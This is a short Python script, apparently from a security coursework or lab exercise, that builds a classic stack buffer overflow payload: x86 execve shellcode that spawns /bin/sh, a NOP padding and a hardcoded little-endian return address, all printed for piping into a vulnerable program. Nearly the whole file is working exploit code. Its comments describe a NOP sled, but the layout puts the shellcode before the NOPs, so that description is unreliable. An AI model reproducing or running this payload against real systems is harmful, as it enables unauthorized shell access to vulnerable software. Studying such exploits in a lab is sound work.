#!/usr/bin/python

#provides a working solution for LITTLE ENDIAN conversion.
import struct

# this is the preferred point of return, practically the addr. of Name[] variable.
# SOS: this is little endian format mostly.
actual_addr = struct.pack("I", 0x80dacc0)

# found online, usage on README.txt
# will open a shell via execve(), 25 bytes.
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

# form a "window" of no-op shifts, 23 bytes.
nop = "\x90" * 23;


# 23+25 = 48 which will lead on the start of return_addr in stack.
# adding the actual_ret to it, will overwrite return_adrr causing the return inside our no-op sledge.
# so after executing no-op (->*23) the arbitary code should be exeecuted.

#this will print on console, use terminal or makefile to redirect.
print shellcode + nop + actual_addr

	
